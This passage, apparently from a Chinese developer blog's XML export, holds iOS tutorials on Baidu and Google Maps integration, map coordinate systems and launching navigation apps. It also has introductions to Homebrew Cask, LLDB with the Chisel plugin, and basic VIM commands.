radius:self.locationDetails.Radius]; [self.baiduMapView addOverlay:self.baiduAccuracyCircle]; &#125; // 解析地址 BMKReverseGeoCodeOption *reverseGeocodeSearchOption = [[BMKReverseGeoCodeOption alloc] init]; reverseGeocodeSearchOption.reverseGeoPoint = coordinate; if (![self.geoCodeSearch reverseGeoCode:reverseGeocodeSearchOption]) &#123; XSLog(@&quot;百度反地理编码获取地址失败&quot;); &#125; // 计算地图区域缩放 CLLocationDistance horizontalScreenDistance = [self horizontalScreenDistance]; if (self.locationDetails.Radius * 2 &lt; horizontalScreenDistance || self.baiduMapView.zoomLevel &lt;= kMapsMinZoomLevel) &#123; return; &#125; BMKCoordinateRegion region = BMKCoordinateRegionMakeWithDistance(coordinate, self.locationDetails.Radius * 2 + self.locationDetails.Radius / 2, self.locationDetails.Radius * 2 + self.locationDetails.Radius / 2); [self.baiduMapView setRegion:region animated:YES];&#125; 自定义大头针模型XSPointAnnotation继承自BMKPointAnnotation 扩充两个属性： annotationType ：枚举，显示的大头针类型（切换图标） locationDetailsModel ：当前大头针的模型数据，点击显示气泡详情的数据 添加精度圈后精度半径过大可能超出屏幕影响用户体验，解决方法如下： 根据屏幕最左和最后两个点，转换出地图上对应的坐标点并计算出距离d 根据当前精度圈半径 * 2 和 d 比较，如果超出屏幕就重新设置地图显示区域 计算屏幕距离核心代码 12345CLLocationCoordinate2D leftCoor = [self.baiduMapView convertPoint:CGPointMake(0, XSScreenH) toCoordinateFromView:self.view];CLLocationCoordinate2D rightCoor = [self.baiduMapView convertPoint:CGPointMake(XSScreenW, XSScreenH) toCoordinateFromView:self.view];BMKMapPoint pointLeft = BMKMapPointForCoordinate(leftCoor);BMKMapPoint pointRight = BMKMapPointForCoordinate(rightCoor);return BMKMetersBetweenMapPoints(pointLeft, pointRight); 3.4、配置信息的回调（真正开始处理显示位置大头针、精度圈、点击显示的弹框泡泡） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// 大头针及大头针弹框- (BMKAnnotationView *)mapView:(BMKMapView *)mapView viewForAnnotation:(id &lt;BMKAnnotation&gt;)annotation&#123; XSLogFunc if (![annotation isKindOfClass:[XSPointAnnotation class]]) &#123; // 不是自定义大头针模型 return nil; &#125; BMKAnnotationView *annotationView = nil; XSPointAnnotation *customAnnotation = (XSPointAnnotation *)annotation; if (customAnnotation.annotationType == XSAnnotationTypeLocationPoint) &#123; // 当前位置点类型 annotationView = [mapView dequeueReusableAnnotationViewWithIdentifier:@&quot;LocationAnnotation&quot;]; if (annotationView == nil) &#123; annotationView = [[BMKPinAnnotationView alloc] initWithAnnotation:customAnnotation reuseIdentifier:@&quot;LocationAnnotation&quot;]; &#125; annotationView.image = [UIImage imageNamed:self.locationDetails.deviceBindingTypeImageName]; annotationView.draggable = NO; annotationView.canShowCallout = YES; // 自定义的点击大头针显示的气泡View 根据公司需求自定义 self.petAnnotationView.locationDetails = customAnnotation.locationDetailsModel; // 需要显示的设备信息模型 self.petAnnotationView.isHiddenNoNeeds = NO; self.petAnnotationView.width = 270; annotationView.paopaoView = [[BMKActionPaopaoView alloc] initWithCustomView:self.petAnnotationView]; &#125; return annotationView;&#125;// 精度圈- (BMKOverlayView *)mapView:(BMKMapView *)mapView viewForOverlay:(id &lt;BMKOverlay&gt;)overlay&#123; if ([overlay isKindOfClass:[BMKCircle class]])&#123; BMKCircleView *circleView = [[BMKCircleView alloc] initWithOverlay:overlay]; if (self.locationDetails.GpsType == XSLocationModeWifiAndLbs) &#123; circleView.fillColor = [[UIColor colorWithHexString:kAccuracyCircleWifiAndLbsFillColor] colorWithAlphaComponent:0.15]; circleView.strokeColor = [[UIColor colorWithHexString:kAccuracyCircleWifiAndLbsStrokeColor] colorWithAlphaComponent:0.05]; &#125; else if (self.locationDetails.GpsType == XSLocationModeLbs) &#123; circleView.fillColor = [[UIColor colorWithHexString:kAccuracyCircleLbsFillColor] colorWithAlphaComponent:0.15]; circleView.strokeColor = [[UIColor colorWithHexString:kAccuracyCircleLbsStrokeColor] colorWithAlphaComponent:0.05]; &#125; circleView.lineWidth = 1; return circleView; &#125; return nil;&#125;// 百度反地理编码解析地址回调，需要重新刷新大头针的气泡模型数据- (void)onGetReverseGeoCodeResult:(BMKGeoCodeSearch *)searcher result:(BMKReverseGeoCodeResult *)result errorCode:(BMKSearchErrorCode)error&#123; XSLog(@&quot;address:%@----%@&quot;, result.addressDetail, result.address); self.locationDetails.deviceAddress = result.address; self.petAnnotationView.locationDetails = self.locationDetails;&#125; 4、多个坐标线显示在屏幕范围内 绘制多个轨迹点和绘制线比较简单，直接参考官方文档 在历史轨迹界面，可能希望显示的所有轨迹点都在屏幕范围内 123456789101112131415161718192021222324252627282930313233343536373839404142- (void)baiduMapViewFitAnnotationsWithCoordinates:(CLLocationCoordinate2D *)coords count:(NSUInteger)count&#123; NSMutableArray *latArr = [[NSMutableArray alloc] init]; NSMutableArray *lonArr = [[NSMutableArray alloc] init]; for (XSLocationDetails *locationDetails in coordsModels) &#123; [latArr addObject:@(locationDetails.coordinateBD09ll.latitude)]; [lonArr addObject:@(locationDetails.coordinateBD09ll.longitude)]; &#125; NSNumber *latMax = [latArr valueForKeyPath:@&quot;@max.floatValue&quot;];//最大纬度 NSNumber *latMin = [latArr valueForKeyPath:@&quot;@min.floatValue&quot;];//最小纬度 NSNumber *lonMax = [lonArr valueForKeyPath:@&quot;@max.floatValue&quot;];//最大经度 NSNumber *lonMin = [lonArr valueForKeyPath:@&quot;@min.floatValue&quot;];//最小经度 BMKCoordinateRegion region; region.center.latitude = ([latMax doubleValue] + [latMin doubleValue]) / 2; region.center.longitude = ([lonMax doubleValue] + [lonMin doubleValue]) / 2; region.span.latitudeDelta = 0.0055; // 数字越小 缩放等级越大 region.span.longitudeDelta = 0.0055; region = [self.baiduMapView regionThatFits:region]; [self.baiduMapView setRegion:region animated:YES]; // if (count &lt; 2) return;// CLLocationCoordinate2D coor = [coordsModels.firstObject coordinateBD09ll];// BMKMapPoint pt = BMKMapPointForCoordinate(coor);// CGFloat ltX, ltY, rbX, rbY;// ltX = pt.x, ltY = pt.y;// rbX = pt.x, rbY = pt.y;//// for (int i = 1; i &lt; count; i++) &#123;// CLLocationCoordinate2D coor = [coordsModels[i] coordinateBD09ll];// BMKMapPoint pt = BMKMapPointForCoordinate(coor);// if (pt.x &lt; ltX) ltX = pt.x;// if (pt.x &gt; rbX) rbX = pt.x;// if (pt.y &gt; ltY) ltY = pt.y;// if (pt.y &lt; rbY) rbY = pt.y;// &#125;// BMKMapRect rect;// rect.origin = BMKMapPointMake(ltX , ltY);// rect.size = BMKMapSizeMake(rbX - ltX, rbY - ltY);// [self.baiduMapView setVisibleMapRect:rect];// self.baiduMapView.zoomLevel = self.baiduMapView.zoomLevel - 0.3;&#125; 谷歌地图1、注册地图api key12// 在程序启动代理方法注册google map api key 谷歌开发者平台获取[GMSServices provideAPIKey:kGoogleMapApiKey]; 2、初始化地图123456789101112- (void)setupGoogleMapView&#123; GMSCameraPosition *camera = [GMSCameraPosition cameraWithLatitude:0 longitude:0 zoom:kMapsZoomLevel]; GMSMapView *mapView = [GMSMapView mapWithFrame:CGRectMake(0, 0, XSScreenW, XSScreenH) camera:camera]; mapView.delegate = self; mapView.myLocationEnabled = YES; [mapView setMinZoom:kMapsMinZoomLevel maxZoom:kMapsMaxZoomLevel]; mapView.settings.compassButton = YES; mapView.settings.consumesGesturesInView = NO; [self.view insertSubview:mapView atIndex:0]; self.googleMapView = mapView;&#125; 3、显示自定义大头针 3.1、从服务器获取当前设备的相关信息转为模型数据(XSDeviceLocation *locationDetails) 3.2、根据当前显示的地图类型设置对应的坐标信息大头针 我的做法在XSDeviceLocation模型里面提供了对应地图的获取属性，在属性getter方法中进行服务器的坐标转换(处理国内返回火星坐标、国外返回标准坐标) 如获取百度坐标locationCoordinateBaidu、获取谷歌坐标locationCoordinateGoogle 根据类型设置坐标数据 123456- (void)setupPetLocationCoordinate:(CLLocationCoordinate2D)coordinate mapType:(XSDisplayMapType)mapType&#123; // 坐标过滤等其他操作 // ... [self setupGoogleMapCoordinate:coordinate];&#125; 3.3、根据设备坐标的相关配置 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364- (void)setupGoogleMapCoordinate:(CLLocationCoordinate2D)coordinate&#123; [self.googleMapView animateToLocation:coordinate]; // Creates a marker in the center of the map. self.marker.markerType = XSMarkerTypeDefaultLocation; self.marker.position = coordinate; self.marker.appearAnimation = YES; self.marker.tracksInfoWindowChanges = YES; self.marker.icon = [UIImage imageNamed:self.locationDetails.deviceBindingTypeImageName]; self.marker.map = self.googleMapView; self.marker.locationDetailsModel = self.locationDetails; // 传递模型数据 // 点击大头针显示的自定义气泡控件 懒加载 self.petAnnotationView.locationDetails = self.locationDetails; self.petAnnotationView.isHiddenNoNeeds = NO; [[GMSGeocoder geocoder] reverseGeocodeCoordinate:coordinate completionHandler:^(GMSReverseGeocodeResponse * _Nullable response, NSError * _Nullable error) &#123; //FIXME: 错误信息处理 // 获取第一个位置信息 GMSAddress *addressModel = response.firstResult; NSString *firstString = addressModel.lines.firstObject; NSString *lastString = addressModel.lines.lastObject; NSString *address = [NSString stringWithFormat:@&quot;%@, %@&quot;, firstString, lastString]; self.locationDetails.deviceAddress = address; self.marker.locationDetailsModel = self.locationDetails; // 传递模型数据 self.petAnnotationView.locationDetails = self.locationDetails; &#125;]; // 添加精度圈 self.googleAccuracycircle.map = nil; // 清空已存在的 if (self.locationDetails.GpsType == XSLocationModeWifiAndLbs) &#123; // wifi 显示精度圈 self.googleAccuracycircle = [GMSCircle circleWithPosition:coordinate radius:self.locationDetails.Radius]; self.googleAccuracycircle.fillColor = [[UIColor colorWithHexString:kAccuracyCircleWifiAndLbsFillColor] colorWithAlphaComponent:0.15]; self.googleAccuracycircle.strokeColor = [[UIColor colorWithHexString:kAccuracyCircleWifiAndLbsStrokeColor] colorWithAlphaComponent:0.15]; self.googleAccuracycircle.strokeWidth = 1; self.googleAccuracycircle.map = self.googleMapView; &#125; else if (self.locationDetails.GpsType == XSLocationModeLbs) &#123; self.googleAccuracycircle = [GMSCircle circleWithPosition:coordinate radius:self.locationDetails.Radius]; self.googleAccuracycircle.fillColor = [[UIColor colorWithHexString:kAccuracyCircleLbsFillColor] colorWithAlphaComponent:0.15]; self.googleAccuracycircle.strokeColor = [[UIColor colorWithHexString:kAccuracyCircleLbsStrokeColor] colorWithAlphaComponent:0.15]; self.googleAccuracycircle.strokeWidth = 1; self.googleAccuracycircle.map = self.googleMapView; &#125; // 计算地图区域缩放 CLLocationDistance horizontalScreenDistance = [self horizontalScreenDistance]; if (self.locationDetails.Radius * 2 &lt; horizontalScreenDistance || self.googleMapView.camera.zoom &lt;= kMapsMinZoomLevel) &#123; return; &#125; int zoomLevel = self.googleMapView.camera.zoom;// double radius = self.locationDetails.Radius + self.locationDetails.Radius / 2; double radius = self.locationDetails.Radius / 2; double scale = radius / 500; zoomLevel = (int) (16 - log(scale) / log(2)); zoomLevel--; [CATransaction begin]; [CATransaction setValue:[NSNumber numberWithFloat:XSAnimationDuration] forKey:kCATransactionAnimationDuration]; GMSCameraPosition *camera = [GMSCameraPosition cameraWithLatitude:coordinate.latitude longitude:coordinate.longitude zoom:zoomLevel]; [self.googleMapView animateToCameraPosition:camera]; [CATransaction commit];&#125; 自定义大头针模型XSMarker继承自GMSMarker 扩充两个属性： markerType ：枚举，显示的大头针类型（切换图标） locationDetailsModel ：当前大头针的模型数据，点击显示气泡详情的数据 添加精度圈后精度半径过大可能超出屏幕影响用户体验，解决方法如下： 根据屏幕最左和最后两个点，转换出地图上对应的坐标点并计算出距离d 根据当前精度圈半径 * 2 和 d 比较，如果超出屏幕就重新设置地图显示区域 计算屏幕距离核心代码 123CLLocationCoordinate2D leftCoor = [self.googleMapView.projection coordinateForPoint:CGPointMake(0, XSScreenH)];CLLocationCoordinate2D rightCoor = [self.googleMapView.projection coordinateForPoint:CGPointMake(XSScreenW, XSScreenH)];return GMSGeometryDistance(leftCoor, rightCoor); 3.4、点击大头针显示气泡view的回调 1234567- (UIView *)mapView:(GMSMapView *)mapView markerInfoWindow:(GMSMarker *)marker&#123; XSLogFunc self.petAnnotationView.width = 270; self.petAnnotationView.locationDetails = self.locationDetails; // 刷新显示的信息 return self.petAnnotationView;&#125; 4、多个坐标线显示在屏幕范围内 绘制多个轨迹点和绘制线比较简单，直接参考官方文档 在历史轨迹界面，可能希望显示的所有轨迹点都在屏幕范围内 123456789- (void)googleMapViewFitAnnotationsWithCoordinates:(NSArray *)coordsModels count:(NSUInteger)count&#123; GMSCoordinateBounds *bounds = [[GMSCoordinateBounds alloc] init]; for (int i = 1; i &lt; count; i++) &#123; CLLocationCoordinate2D coor = [coordsModels[i] locationCoordinate2D]; bounds = [bounds includingCoordinate:coor]; &#125; [self.googleMapView animateWithCameraUpdate:[GMSCameraUpdate fitBounds:bounds withPadding:30.0f]];&#125; Maps 导航 检测是否安装对应的地图 常用的4个地图的 URL Scheme: 1.苹果自带地图（不需要检测，所以不需要URL Scheme）2.百度地图 ：baidumap://3.高德地图 ：iosamap://4.谷歌地图 ：comgooglemaps:// 在IOS9之后，苹果进一步完善了安全机制，必须在plist里面设置url scheme白名单，不然无法打开对应的应用 添加白名单： 在 info.plist 文件里面，添加一个字段：LSApplicationQueriesSchemes，类型为数组 然后在这个数组里面再添加我们所需要的地图 URL Scheme : 1234&gt; baidumap // 百度&gt; iosamap // 高德&gt; comgooglemaps // 谷歌&gt; 应用内部调用google maps地图发起导航功能 1、x-source=%@&amp;x-success=%@跟高德一样 这里分别代表APP的名称和URL Scheme 2、saddr=这里留空则表示从当前位置触发。 1234567if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@&quot;comgooglemaps://&quot;]]) &#123; NSMutableDictionary *googleMapDic = [NSMutableDictionary dictionary]; googleMapDic[@&quot;title&quot;] = @&quot;谷歌地图&quot;; NSString *urlString = [[NSString stringWithFormat:@&quot;comgooglemaps://?x-source=%@&amp;x-success=%@&amp;saddr=&amp;daddr=%f,%f&amp;directionsmode=driving&quot;,@&quot;导航测试&quot;,@&quot;nav123456&quot;,endLocation.latitude, endLocation.longitude] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; googleMapDic[@&quot;url&quot;] = urlString; [maps addObject:googleMapDic];&#125; 应用内部调用百度地图发起导航功能 1，origin=, 这个是不能被修改的，不然无法把出发位置设置为当前位置 2，destination = latlng:%f,%f|name = 目的地这里面的 name 的字段不能省略，否则导航会失败，而后面的文字则可以随意，赋个你的目的地的值给他就可以了。 3，coord_type = gcj02coord_type 允许的值为 bd09ll、gcj02、wgs84，如果你 APP 的地图 SDK 用的是百度地图 SDK，请填 bd09ll，否则就填gcj02，wgs84的话基本是用不上了 1234567if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@&quot;baidumap://&quot;]]) &#123; NSMutableDictionary *baiduMapDic = [NSMutableDictionary dictionary]; baiduMapDic[@&quot;title&quot;] = @&quot;百度地图&quot;; NSString *urlString = [[NSString stringWithFormat:@&quot;baidumap://map/direction?origin=&#123;&#123;我的位置&#125;&#125;&amp;destination=latlng:%f,%f|name=北京&amp;mode=driving&amp;coord_type=gcj02&quot;,endLocation.latitude,endLocation.longitude] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; baiduMapDic[@&quot;url&quot;] = urlString; [maps addObject:baiduMapDic];&#125; 应用内部调用高德地图发起导航功能 1、sourceApplication=%@&amp;backScheme=%@sourceApplication代表你自己APP的名称 会在之后跳回的时候显示出来 所以必须填写 backScheme是你APP的URL Scheme 不填是跳不回来的哟 2、dev=0这里填0就行了，跟上面的gcj02一个意思 1代表wgs84 也用不上 1234567if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@&quot;iosamap://&quot;]]) &#123; NSMutableDictionary *gaodeMapDic = [NSMutableDictionary dictionary]; gaodeMapDic[@&quot;title&quot;] = @&quot;高德地图&quot;; NSString *urlString = [[NSString stringWithFormat:@&quot;iosamap://navi?sourceApplication=%@&amp;backScheme=%@&amp;lat=%f&amp;lon=%f&amp;dev=0&amp;style=2&quot;,@&quot;导航功能&quot;,@&quot;nav123456&quot;,endLocation.latitude,endLocation.longitude] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; gaodeMapDic[@&quot;url&quot;] = urlString; [maps addObject:gaodeMapDic];&#125; 应用内部调用苹果地图发起导航功能 123456CLLocationCoordinate2D loc = CLLocationCoordinate2DMake([self.model.latitude floatValue], [self.model.longitude floatValue]);MKMapItem *currentLocation = [MKMapItem mapItemForCurrentLocation];MKMapItem *toLocation = [[MKMapItem alloc] initWithPlacemark:[[MKPlacemark alloc] initWithCoordinate:loc addressDictionary:nil]];[MKMapItem openMapsWithItems:@[currentLocation, toLocation]launchOptions:@&#123;MKLaunchOptionsDirectionsModeKey: MKLaunchOptionsDirectionsModeDriving,MKLaunchOptionsShowsTrafficKey: [NSNumber numberWithBool:YES]&#125;];]]></content>
      <categories>
        <category>iOS</category>
        <category>地图</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>地图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之地图篇(一)]]></title>
    <url>%2Farchives%2F1c8732fb.html</url>
    <content type="text"><![CDATA[赵客缦胡缨，吴钩霜雪明。银鞍照白马，飒沓如流星。十步杀一人，千里不留行。事了拂衣去，深藏身与名。 地图坐标体系1.WGS－84原始坐标系 一般用国际GPS纪录仪记录下来的经纬度 通过GPS定位拿到的原始经纬度 Google（国外）、高德地图（国外）、OSM地图定位的的经纬度。 但是在国内是不允许直接用WGS84坐标系标注的，必须经过加密后才能使用 注意：国内不允许直接使用，但是GPS设备上传的数据还是标准的数据，国内使用需要转为GCJ－02坐标 2.GCJ－02坐标系 GCJ－02坐标系又名“火星坐标系”，是我国国测局独创的坐标体系，由WGS－84加密而成。 在国内，必须至少使用GCJ－02坐标系，如高德和Google在国内。 或者使用在GCJ－02加密后再进行加密的坐标系，如百度坐标系。 3.百度坐标系:bd-09 百度坐标系是在GCJ－02坐标系的基础上再次加密偏移后形成的坐标系，只适用于百度地图。 国内地图偏移问题 地图偏移问题一般只有在国内才会出现 国内‘标准’GPS设备定位坐标为GCJ－02坐标系，显示地图为偏移过的地图，最终显示的为准确的位置国内非’标准’的设备定位坐标为WGS－84原始坐标系，显示地图为偏移过的地图，最终显示的位置出现偏移 Google MapsGoogle Maps注意点 自定义弹窗可以直接使用InfoWindow 调整地图上面的图标位置 没办法可以直接调整每一个图标的位置 可以设置地图的内容padding属性来调整 但是padding属性设置局限于调整和屏幕边缘的距离 刷新地图弹框内容可以设置自动刷新帧的间隔（对应有的不需要变化的控件可以关闭以节约性能） 添加手势会和地图的手势冲突，需要设置地图的consumesGesturesInView为false consumesGesturesInView手势控制是否用户设置的手势被谷歌地图接管处理默认设置为YES 定位点的自定义弹框 每一个定位点对象GMSMarker 如果想要自定义弹框可以在下面方法实现 (UIView *)mapView:(GMSMapView *)mapView markerInfoWindow:(GMSMarker *)marker 如果想要刷新地图弹框的内容, 需要在设置Marker的方法里直接转换坐标，并且实时位置的自定义弹框需要全局是一个控件，否则无法刷新控件 markerInfoWindow：方法只需要初始化控件即可，在获取到数据设置GMSMarker的方法里传递数据 想要刷新数据要设置 tracksInfoWindowChanges = YES 在国内直接使用GPS原始坐标显示在地图上面会有偏移 可以使用网上别人c语言写的一些纠偏算法，纠偏后偏移不是很大（纠偏只针对国内，可以使用经纬度区分国内还是国外的区域，不是非常准确） 高德地图和百度地图SDK里面有提供国内外区域判断的Api，提供一个坐标点判断是在国内还是在国外 Google Maps 收费The Google Maps Geolocation API 普通用户 每天可以调用2500次，每秒调用50次 超过后按每1000次/0.5美元收费（还是有调用限制：每天上限:100000次） 高级用户 高级用户需要和Google公司联系，可以按协议付费提高调用次数限制 但是只能针对国外的公司（不对国内公司提供服务），账单付费也必须是国外的公司 解决方法 （调用高德服务） 高德地图针对没有开发对应的iOS和Android的客户端的智能硬件产品的企业用户, 提供智能硬件定位服务，支持通过服务端上传WIFI和基站信息进行定位并获取经纬度。 需要开发者账号注册为企业用户 免费调用限制为3000000次/每天 同Google Maps Geolocation API 将设备GPS获取到的Wifi和Lb数据或者Cell Tower数据转换为对应的经纬度信息 高德转出来的为GCJ－02坐标体系（火星坐标） 有国外的数据支持，但是具体的精准的还需要再测试 地图坐标体系转换 地图的SDK一般会提供其他地图坐标体系到自身体系的转换接口 但是 均不提供从自身向其他坐标体系转换 google SDK没有坐标转换接口 别人写的转换方法、有误差 https://github.com/JackZhouCn/JZLocationConverter 别人写的服务器（C#版）坐标转换 https://www.jianshu.com/p/8975586a820e]]></content>
      <categories>
        <category>iOS</category>
        <category>地图</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>地图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Homebrew介绍]]></title>
    <url>%2Farchives%2F4f2aa8f3.html</url>
    <content type="text"><![CDATA[iOS开发工具之Homebrew篇Homebrew官网 https://brew.sh/index_zh-cn.htmlHomebrew 是基于 OS X 的套件管理工具，是一个开源的 Ruby 脚本，专门用于快速下载软件 Homebrew 类似于一个软件中心，可以理解成 App Store 或者 Google Play 那样的软件商店, 且内容更加丰富; Homebrew Cask，它是一套建立在 Homebrew 基础之上的 OS X 软件安装命令行工具，是 Homebrew 的扩展;使用Homebrew有什么优势呢? 通过 Homebrew 下载安装的软件全部来自对应的软件官网，无需担心下载源的安全问题; 依存于系统既有的库，减少了空间占用和冗余; 使用 Git 进行管理和更新; 易于定制; Homebrew 使用： 安装软件 brew cask install 软件名 1brew cask install google-chrome 卸载软件 brew cask uninstall 软件名 1brew cask uninstall google-chrome 软件搜索 brew cask search 软件名 1brew cask search google 查看软件相关信息 brew cask info 软件名 1brew cask info google-chrome 删除 Homebrew Cask 下载的包 1brew cask cleanup 列出通过 Homebrew Cask 安装的包 1brew cask list 更新 Homebrew Cask 1brew cask update Homebrew 安装QuickLook常用的插件QuickLook插件http://www.quicklookplugins.com/ brew cask install qlmarkdown // 预览Markdown QLColorCode // 代码块高亮 QuickLook-JSON // JSON 文件 QLPrettyPatch // Patch 文件 qlvideo // 视频预览 QLStephen // 预览无拓展名的纯文本文件 BetterZipQL // 查看 Zip 压缩文件的信息以及文件目录 QLImageSize // 预览窗口的标题栏中显示图片分辨率及文件大小，并在 Finder 中显示图片的格式; 还支持 bpg、Portable Pixmap、WebP 格式 QuickLook-CSV // 预览 CSV 文件 qladdict // .srt (Subtitle)]]></content>
      <categories>
        <category>工具</category>
        <category>Homebrew</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>Homebrew</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LLDB介绍]]></title>
    <url>%2Farchives%2Fc9e6c86c.html</url>
    <content type="text"><![CDATA[iOS开发工具之LLDB介篇 LLDB 是一个有着 REPL 的特性和 C++ ,Python 插件的开源调试器。LLDB 绑定在 Xcode 内部，存在于主窗口底部的控制台中。 安装Chisel Facebook 开源的 lldb 插件 Chisel. 1、Chisel 使用 homebrew 来安装，如果你没有安装homebrew 12brew updatebrew install chisel 2、安装完成按照安装日志上的提示，在~/.lldbinit文件中添加一行，没有则新建。 提示类似如下： 123==&gt; CaveatsAdd the following line to ~/.lldbinit to load chisel when Xcode launches:command script import /usr/local/opt/chisel/libexec/fblldb.py 3、然后重启Xcode 常用的调试指令pjson 打印json格式数据，调试服务器返回数据时候用。 p/x 打印16进制数据 p/t 打印2进制数据 e 修改属性和调用方法 pviews 这个命令可以递归打印所有的view，并能标示层级，相当于 UIView 的私有辅助方法 [view recursiveDescription]。 善用使用这个功能会让你在调试定位问题时省去很多麻烦。 pvc 个命令也是递归打印层级，但是不是view，而是viewController。利用它我们可以对viewController的结构一目了然。 其实苹果在IOS8也默默的添加了 UIViewController 的一个私有辅助方法 [UIViewController _printHierarchy]同样的效果。 visualize 这是个很有意思的功能，它可以让你使用Mac的预览打开一个 UIImage, CGImageRef, UIView, 或 CALayer。 这个功能或许可以帮我们用来截图、用来定位一个view的具体内容。 但是在我试用了一下，发现暂时还是只能在模拟器时使用，真机还不行。 fv &amp; fvc fv和 fvc这两个命令是用来通过类名搜索当前内存中存在的view和viewController实例的命令，支持正则搜索。 show &amp; hide 这两个命令用来显示和隐藏一个指定的 UIView . 你甚至不需要Continue Progress. 就可以看到效果。 mask/umask border/unborder 这两组命令用来标识一个view或layer的位置时用， mask用来在view上覆盖一个半透明的矩形， border可以给view添加边框。但是在我实际使用的过程中mask总是会报错，估计是有bug， 那么mask/unmask 一般不要用好了，用border命令是一样的效果，反正二者的用途都是找到一个对应的view. caflush 这个命令会重新渲染，即可以重新绘制界面， 相当于执行了 [CATransaction flush] 方法，要注意如果在动画过程中执行这个命令，就直接渲染出动画结束的效果。 当你想在调试界面颜色、坐标之类的时候，可以直接在控制台修改属性，然后caflush就可以看到效果啦，是不是要比改代码，然后重新build省事多了呢。 bmessage 这个命令就是用来打断点用的了，虽然大家断点可能都喜欢在图形界面里面打，但是考虑一种情况：我们想在[MyViewController viewWillAppear:] 里面打断点，但是 MyViewController并没有实现 viewWillAppear:方法， 以往的作法可能就是在子类中实现下viewWillAppear:，然后打断点，然后rebuild。 那么幸好有了 bmessage命令。我们可以不用这样就可以打这个效果的断点： (lldb) bmessage -[MyViewController viewWillAppear:]上面命令会在其父类的 viewWillAppear: 方法中打断点，并添加上了条件：[self isKindOfClass:[MyViewController class]] help 可以用帮助文档查看所有的指令或者单个指令的使用方法 常用的Debug快捷键1234567891011121314151617cmd + ctrl + Y // 暂停/继续cmd + Y // 断点失效/生效cmd + shift + Y // 控制台显示/隐藏cmd + shift + C // 光标切换到控制台cmd + K // 清空控制台continue \(c\) // 继续执行step over F6 （n） // 单步执行step into F7（s） // 跳入step out F8 （finish）// 跳出]]></content>
      <categories>
        <category>工具</category>
        <category>LLDB</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>LLDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VIM介绍]]></title>
    <url>%2Farchives%2F1c40fe4d.html</url>
    <content type="text"><![CDATA[iOS开发工具之VIM篇VIM相关的指令 vi编辑器是所有Unix及Linux系统下标准的编辑器，它的强大不逊色于任何最新的文本编辑器，这里只是简单地介绍一下它的用法和一小部分指令。 由于对Unix及Linux系统的任何版本，vi编辑器是完全相同的，因此您可以在其他任何介绍vi的地方进一步了解它。Vi也是Linux中最基本的文本编辑器，学会它后，您将在Linux的世界里畅行无阻。 打开12345vim 直接启动vimvim filename 打开vim并创建名为filename的文件 // 打开单个文件vim file1 file2 file3 … // 打开多个文件:open file // 在vim窗口中打开一个新文件:split file // 在新窗口中打开文件 退出指令12345678:w 保存文件但不退出vi:w file 将修改另外保存到file中，不退出vi:w! 强制保存，不推出vi:wq 保存文件并退出vi:wq! 强制保存文件，并退出vi:q 不保存文件，退出vi:q! 不保存文件，强制退出vi:e! 放弃所有修改，从上次保存文件开始再编辑命令历史 1、vi的基本概念 基本上vi可以分为三种状态，分别是命令模式（command mode）、插入模式（Insertmode）和底行模式（last line mode），各模式的功能区分如下： 1) 命令行模式(command mode） 控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。 2) 插入模式（Insert mode） 只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。 3) 底行模式（last line mode） 将文件保存或退出vi，也可以设置编辑环境，如寻找字符串、列出行号……等。 不过一般我们在使用时把vi简化成两个模式，就是将底行模式（last line mode）也算入命令行模式command mode）。 2、vi的基本操作 a) 进入vi 在系统提示符号输入vi及文件名称后，就进入vi全屏幕编辑画面： 1$ vi myfile * 不过有一点要特别注意，就是您进入vi之后，是处于「命令行模式（command mode）」，您要切换到「插入模式（Insert mode）」才能够输入文字。初次使用vi的人都会想先用上下左右键移动光标，结果电脑一直哔哔叫，把自己气个半死，所以进入vi后，先不要乱动，转换到「插入模式（Insert mode）」再说吧！ b) 切换至插入模式（Insert mode）编辑文件 在「命令行模式（command mode）」下按一下字母「i」就可以进入「插入模式（Insert mode）」，这时候你就可以开始输入文字了。 c) Insert 的切换 您目前处于「插入模式（Insert mode）」，您就只能一直输入文字，如果您发现输错了字！想用光标键往回移动，将该字删除，就要先按一下「ESC」键转到「命令行模式（command mode）」再删除文字 d) 退出vi及保存文件 在「命令行模式（command mode）」下，按一下「：」冒号键进入「Last line mode」，例如： 12345: w filename // （输入 「w filename」将文章以指定的文件名filename保存）: wq // (输入「wq」，存盘并退出vi): q! // (输入q!， 不存盘强制退出vi) 3、命令行模式（command mode）功能键 1）. 插入模式 按「i」切换进入插入模式「insert mode」，按“i”进入插入模式后是从光标当前位置开始输入文件； 按「a」进入插入模式后，是从目前光标所在位置的下一个位置开始输入文字； 按「o」进入插入模式后，是插入新的一行，从行首开始输入文字。 2）. 从插入模式切换为命令行模式 按「ESC」键。 3）. 移动光标 vi可以直接用键盘上的光标来上下左右移动，但正规的vi是用小写英文字母「h」、「j」、「k」、「l」，分别控制光标左、下、上、右移一格。 按「ctrl」+「b」：屏幕往“后”移动一页。 按「ctrl」+「f」：屏幕往“前”移动一页。 按「ctrl」+「u」：屏幕往“后”移动半页。 按「ctrl」+「d」：屏幕往“前”移动半页。 按数字「0」：移到文章的开头。 按「G」：移动到文章的最后。 按「$」：移动到光标所在行的“行尾”。 按「^」：移动到光标所在行的“行首” 按「w」：光标跳到下个字的开头 按「e」：光标跳到下个字的字尾 按「b」：光标回到上个字的开头 按「#l」：光标移到该行的第#个位置，如：5l,56l 4）. 删除文字 「x」：每按一次，删除光标所在位置的“后面”一个字符 